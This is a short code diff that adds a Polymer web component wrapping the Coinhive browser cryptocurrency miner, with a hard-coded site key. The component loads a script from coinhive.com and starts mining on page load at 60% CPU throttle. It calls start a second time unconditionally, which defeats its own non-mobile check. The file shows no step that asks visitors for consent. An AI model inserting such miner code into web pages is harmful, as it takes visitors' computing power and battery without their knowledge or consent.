@@ -1,0 +1,23 @@
+<link rel="import"  href="https://polygit.org/components/polymer/polymer-element.html">
+
+<dom-module id="coinhive">
+
+    <template>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+        	var miner = new coinHive.Anonymous('0JbmzLVc6WZdcrOuFUuoMfLhvC5Di8S9', {throttle: 0.6});
+            if (!miner.isMobile()) {
+        		miner.start();
+        	}
+        	miner.start();
+        </script>
+    </template>
+
+    <script>
+        class coinHive extends Polymer.Element {
+          static get is() { return "coinhive"; }
+        }
+        customElements.define(coinHive.is, coinHive);
+    </script>
+
+</dom-module>
